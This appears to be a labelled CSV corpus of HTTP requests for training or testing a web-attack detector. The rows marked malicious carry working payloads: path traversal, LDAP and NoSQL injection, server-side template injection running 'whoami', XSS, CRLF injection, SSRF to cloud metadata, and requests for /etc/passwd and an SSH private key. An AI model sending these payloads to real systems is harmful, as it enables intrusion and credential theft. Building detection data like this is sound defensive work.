label,text
benign,"POST /user/password/forgot HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Connection: close
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
User-Agent: curl/7.85.0

email=laura.hendrix%40blogmail.info"
benign,"GET /img/animations/refresh-loading.gif HTTP/1.1
Host: api.cloud-data-services.ai
Accept: image/gif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://api.cloud-data-services.ai/docs/v3/endpoints/status
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.194 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: edu-courses-platform.edu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Type: application/json-patch+json
Content-Length: 81
Authorization: Bearer stu-872dalv3qxn684mehd
Accept: application/json
Pragma: no-cache

[{ ""op"": ""replace"", ""path"": ""/notifications/push"", ""value"": false }]"
benign,"GET /downloads/report?file=report-final.pdf HTTP/1.1
Host: analytics-data-center.org
Accept: application/pdf
Sec-CH-UA-Mobile: ?0
Sec-CH-UA: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""113"", ""Google Chrome"";v=""113""
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Cache-Control: no-cache
Referer: https://analytics-data-center.org/dashboard
Connection: close"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: data-api.cloud-storage.ai
Accept: */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sampletoken.example
User-Agent: curl/7.85.0
Connection: close"
malicious,"POST /internal/ldap/search HTTP/1.1
Host: corp-infra-access.io
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
Content-Length: 95
Referer: https://corp-infra-access.io/dashboard

{""searchFilter"": ""(cn=analytics)(objectClass=person)(!(employeeType=contractor))(|(uid=administrator))""}"
malicious,"GET /content/load?file=../../../../../../../../etc/passwd HTTP/1.1
Host: enterprise-analytics-suite.co
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: developer-portal-cloud.tools
Accept: image/svg+xml,image/*;q=0.9,*/*;q=0.8
User-Agent: Python-urllib/3.11
Connection: close"
benign,"PUT /api/v5/employees/3592 HTTP/1.1
Host: hr-centralized-app.biz
Authorization: Bearer eyJhbGc1NiJ9.eyJlbXAiOiJlbXAwOElvIn0.lO2PnUwWXaho2XqYABtKtg
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Content-Length: 144

{""id"":3592,""first_name"":""Alyssa"",""last_name"":""Nguyen"",""department"":""Marketing"",""email"":""alyssa.nguyen@hr-centralized-app.biz"",""status"":""active""}"
benign,"POST /auth/login HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Origin: https://my-personal-blog-site.info
Referer: https://my-personal-blog-site.info/auth/login
Cookie: sid=38fjc9keh21d; csrf=8571db43f2eb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Connection: close

email=timothy.bennett%40gmailmail.net&password=cT7fqD"
benign,"GET /api/v1/chart/data?series=sales&period=monthly HTTP/1.1
Host: analytics-dashboard.cloud-visuals.ai
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer 9f4ae2375d9c4f3791fbc34628d1e5e1
Origin: https://analytics-dashboard.cloud-visuals.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache"
benign,"POST /feedback/form HTTP/1.1
Host: client-support-hub.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Accept-Encoding: br, gzip, deflate
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Referer: https://client-support-hub.org/contact
Connection: close

contact_reason=support&contact_reason=feedback&priority=normal"
malicious,"POST /api/ldap-search HTTP/1.1
Host: employee-records-internal.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 90
Origin: https://employee-records-internal.info

{""searchFilter"": ""(&(mail=jane.doe@example.com)(objectClass=user))(|(uid=administrator))""}"
malicious,"GET /app/profile/details%0d%0aSet-Cookie:%20sessionid=xyz123malicious%0d%0aContent-Length:%2018%0d%0a%0d%0a<script>alert(%271%27)</script> HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://homepage.secure-user-portal.net/
Connection: close"
malicious,"GET /search/query/%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()%7D%7D/results HTTP/1.1
Host: global-viewer.analytics-dominion.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://global-viewer.analytics-dominion.org/search/home
Cache-Control: max-age=0"
benign,"GET /api/v1/employees/EE-452189 HTTP/1.1
Host: hr-management-system.co.uk
Accept: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.tokenpart.signaturepart
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
DNT: 1
Connection: keep-alive"
malicious,"GET /media/viewer HTTP/1.1
Host: digital-media-streaming.tv
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Cookie: skin=../../../../skins/custom/theme.cfg%00nl-NL; sid=2b3c1f6a7e0e
Accept-Encoding: br, gzip, deflate
Referer: https://digital-media-streaming.tv/dashboard"
malicious,"POST /api/v2/validation/pattern-check HTTP/1.1
Host: verify-algos-portal.net
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""92"", ""Google Chrome"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Content-Length: 151

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
benign,"GET /articles/read?id=15 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Referer: https://community.game-dev-forum.org/articles/list
Connection: keep-alive"
benign,"PUT /app/resources/svg/icons/logo.svg HTTP/1.1
Host: creative-marketing-platform.biz
User-Agent: python-httpx/0.24.1
Content-Type: application/octet-stream
Content-Length: 188
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-CSRF-Token: p6eKqeG3H1wNMsEbrzX4ZUfWNHvcZF42v2yRrXmE
Connection: keep-alive

PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj48Y2lyY2xlIGN4PSIxMDAiIGN5PSIxMDAiIHI9Ijk1IiBmaWxsPSIjMDA3Y2ZmIi8+PC9zdmc+"
benign,"GET /fetchMetadata?url=https%3A%2F%2Fmy-personal-blog-site.info%2Fposts%2F2024%2Fwelcome-home HTTP/1.1
Host: api.my-personal-blog-site.info
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept-Language: en-US,en;q=0.7
Pragma: no-cache
Connection: keep-alive
Referer: https://my-personal-blog-site.info/"
benign,"GET /products;category=books/authors/haruki-murakami HTTP/1.1
Host: new-arrivals-press.jp
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Referer: https://new-arrivals-press.jp/products;category=books/
Via: 1.1 varnish
Connection: keep-alive"
benign,"POST /api/user/preferences/theme HTTP/1.1
Host: ui-customization-service.cloud-data-services.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiU3RldmVuQzQ5IiwiaWF0IjoxNjgxODI5MzA2fQ.SR2qX9fYxVvRmJylCpoz-rsEPL2bXtIr7uj8QI1JZ74
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 204

{""themeSettings"":{""colorPalette"":{""background"":""#f7f9fc"",""textPrimary"":""#333333"",""buttons"":{""primary"":""#1e90ff"",""secondary"":""#f0ad4e""}},""fontSettings"":{""family"":""Helvetica Neue"",""size"":{""small"":12,""base"":16,""large"":20}},""animations"":{""enabled"":true,""typicalDurationMs"":300}}}"
benign,"POST /events/registration HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Accept-Encoding: gzip, deflate, br
Origin: https://online-retail-store.biz
Connection: keep-alive

event_id=summer_sale&attendance[]=in_person&attendance[]=virtual"
benign,"GET /js/main.bundle.js HTTP/1.1
Host: media-content-aggregate.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/javascript, */*;q=0.8
Referer: https://media-content-aggregate.net/dashboard
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"POST /api/order/submit HTTP/1.1
Host: orders.fast-move-express.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: application/xml, text/html
Content-Length: 162
Connection: keep-alive
Cache-Control: no-cache

<order>
  <customerId>73921</customerId>
  <items>
    <item>
      <productId>4862</productId>
      <quantity>2</quantity>
    </item>
  </items>
  <priority>normal</priority>
</order>"
benign,"POST /api/v1/payments/charge HTTP/1.1
Host: transaction-secure-payments.io
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Idempotency-Key: 8f4b7c10-33e6-4f29-b3e2-092a5a7e44f3
X-Request-ID: 4d7e7dac-3f09-497c-b4c3-60ae7a969a1b
X-Client-Version: 3.5.1
Accept: application/json
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36

{
  ""amount"": 195.00,
  ""currency"": ""USD"",
  ""customer_id"": ""CUST-89231"",
  ""payment_method"": ""credit_card"",
  ""metadata"": {
    ""order_id"": ""ORD-348203""
  }
}"
benign,"POST /oauth/token HTTP/1.1
Host: auth-secure-portal.io
Content-Type: application/x-www-form-urlencoded
Authorization: Basic Y2xpZW50MTpzZWNyZXQxMjM=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive
Content-Length: 104

grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https%3A%2F%2Fapp.auth-secure-portal.io%2Fcallback&client_id=client1&client_secret=secret123"
benign,"POST /members/signup HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Origin: https://my-personal-blog-site.info
X-Requested-With: XMLHttpRequest
User-Agent: python-requests/2.29.0
Content-Length: 137
Connection: close

{""username"":""carla.benson"",""email"":""carla.benson@my-personal-blog-site.info"",""password"":""Sunflower!2023"",""profile"":{""firstName"":""Carla"",""lastName"":""Benson"",""country"":""USA""}}"
benign,"GET /api/healthz HTTP/1.1
Host: platform-admin-services.io
User-Agent: Datadog-HTTP-Check/1.0
Accept: application/json
Connection: keep-alive"
benign,"GET /api/v2/order/history/98031 HTTP/1.1
Host: quickorderservice.xyz
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiamFuZWRvZSJ9.BYJq4Aj6cdoIPkMdTc3K7pF6Xkg7wb2v55liKcgN0-I
User-Agent: Python-urllib/3.11
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 ""><svg/onload=eval(atob('YWxlcnQoJ1hTUyBpbiBVQScp'))>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /app/user/settings?validation_input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: user-config-manager.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: application/json
Cache-Control: no-cache
Connection: close"
malicious,"POST /file/read HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Accept: */*
Content-Type: application/json
Content-Length: 36
Cache-Control: no-cache
Connection: close

{""filePath"": ""/root/.ssh/id_rsa""}"
benign,"PUT /users/update HTTP/1.1
Host: professional-networking.co.uk
Authorization: Bearer Njc4OTAxMjM0NTY3ODkwOnVzZXI6c2Vzc2lvbjEyMw==
Content-Type: application/json
Accept: application/json
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Length: 92

{""role"":""member"",""company"":""Innovatech Ltd."",""location"":""London"",""isAdmin"":false,""newsletterOptIn"":true}"
benign,"GET /forum/threads/modern-architecture-discussion HTTP/1.1
Host: city-planning-forum.org
Accept: text/html
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
DNT: 1
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /account/authenticate HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Accept-Language: en-US,en;q=0.9
Referer: https://api.cloud-data-services.ai/account/login
Origin: https://api.cloud-data-services.ai
Cookie: auth_token=a9f3f7e0f7fef123bca7; csrf_token=abcD3fgh!9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Connection: close

email=lorenzo.dimarco%40mailcloud.ai&password=CloudSafePass#1997"
benign,"POST /api/v3/order/submit HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-CSRF-Token: d5c82f6a-1a3b-4e33-9a8d-66482f897cb9
Content-Length: 108
Connection: keep-alive

{
  ""order_id"": ""758291"",
  ""product_code"": ""ls-pro-v2"",
  ""quantity"": 3,
  ""delivery_instructions"": ""Leave at back door""
}"
malicious,"POST /api/v3/user/preferences HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 61
X-Requested-With: XMLHttpRequest

theme=dark'; db.users.update({username:'root'},{$set:{isSuperuser:true}}); //&lang=en-US"
benign,"DELETE /api/v1/events/79990012 HTTP/1.1
Host: event-registry-service.eu
Authorization: Bearer a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"GET /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Cookie: lang_pref=../../../../windows/win.ini%00en-US; auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Referer: https://api.cloud-data-services.ai/dashboard"
benign,"GET /community/%E0%A4%AA%E0%A4%B0%E0%A4%BF%E0%A4%95%E0%A5%8D%E0%A4%B7%E0%A4%BE HTTP/1.1
Host: cultural-exchange-hub.in
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36
Connection: keep-alive"
benign,"PUT /user/settings/profile HTTP/1.1
Host: nextgen-photo-gallery.net
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro Build/SP1A.210812.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: application/json
Content-Type: application/json
Referer: https://nextgen-photo-gallery.net/dashboard
Content-Length: 65
Connection: Keep-Alive

{""bio"": ""Photographer specialised in &lt;em&gt;nature&lt;/em&gt; and urban scenes.""}"
malicious,"GET /api/fetch_image?imageUrl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: media-processor.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /api/v3/items/search?filter=active HTTP/1.1
Host: api.cloud-data-services.ai:8181
User-Agent: python-requests/2.31.0
Accept: application/json
X-CSRF-Token: yfR8LWzQsMRU7H6OvCcEb2Rl4tjAfGThtZ7ohzjfgPN
Connection: keep-alive"
benign,"GET /products/electronics/laptops/alpha-series.html HTTP/1.1
Host: premier-electro-store.biz
Cookie: sid=52cd7a9bf2e3cd1f; cart_items=3; currency=USD; promo_code=SUMMER24; _gid=GA1.2.1987654321.1687654321
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Connection: keep-alive"
malicious,"POST /user/profile/edit HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: https://community.game-dev-forum.org
Referer: https://community.game-dev-forum.org/user/profile/edit
Connection: keep-alive

username=devguy&action=update&comment=good_post&username=superadmin&action=delete&comment=%3Cscript%3Ealert(%221%22)%3C%2Fscript%3E"
benign,"POST /post/reply HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.79.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 131
Connection: keep-alive

message=I+think+you+should+use+document.querySelectorAll%28'.btn'%29+if+you+have+multiple+elements+instead+of+getElementById."
